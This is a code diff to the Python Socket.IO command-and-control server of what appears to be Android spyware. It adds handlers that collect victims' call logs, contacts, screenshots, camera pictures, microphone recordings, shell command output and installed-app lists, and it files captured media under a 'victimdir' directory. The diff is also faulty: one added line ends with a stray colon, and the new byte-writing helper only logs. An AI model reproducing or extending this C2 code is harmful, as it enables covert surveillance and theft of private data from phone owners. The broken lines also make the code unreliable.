@@ -31,7 +31,7 @@ socketio = SocketIO(app)
 0x11 - Change Device Password
 '''
 
-def write_to_log(data):
+def write_to_log_file(data):
     with open('c2.log', 'a') as f:
         f.write(f"{data['device_id']}: {data['message']}")
 
@@ -40,7 +40,7 @@ def log_to_console(data):
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
     else:
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
-    write_to_log(data)
+    write_to_log_file(data)
 
 
 def update_database_and_log(value, data):
@@ -55,8 +55,12 @@ def update_database_and_log(value, data):
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
     else:
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
-    write_to_log(data)
+    write_to_log_file(data)
 
+
+def write_bytes_and_log(value, data):
+    # write bytes
+    write_to_log_file(data)
 
 # Connection from C2
 @socketio.on('connect')
@@ -148,7 +152,7 @@ def read_sms_listener(data):
 
 @socketio.on('0x2')
 def read_call_log_listener(data):
-    print(data)
+    update_database_and_log('readcalllogs', data)
 
 
 @socketio.on('0x3')
@@ -158,12 +162,12 @@ def make_phone_call_listener(data):
 
 @socketio.on('0x4')
 def dial_ussd_listener(data):
-    print(data)
+    log_to_console(data)
 
 
 @socketio.on('0x5')
 def read_contacts_listener(data):
-    print(data)
+    update_database_and_log('readcontacts', data)
 
 
 @socketio.on('0x6')
@@ -173,32 +177,32 @@ def write_contact_listener(data):
 
 @socketio.on('0x7')
 def screenshot_listener(data):
-    print(data)
+    write_bytes_and_log('victimdir', data)
 
 
 @socketio.on('0x8')
 def get_camera_list_listener(data):
-    print(data)
+    update_database_and_log('cameralist', data)
 
 
 @socketio.on('0x9')
 def take_picture_listener(data):
-    print(data)
+    write_bytes_and_log('victimdir', data)
 
 
 @socketio.on('0xA')
 def record_mic_listener(data):
-    print(data)
+    write_bytes_and_log('victimdir', data):
 
 
 @socketio.on('0xB')
 def sh_command_listener(data):
-    print(data)
+    log_to_console(data)
 
 
 @socketio.on('0xC')
 def list_installed_apps_listener(data):
-    print(data)
+    update_database_and_log('installedapps', data)
 
 
 @socketio.on('0xD')
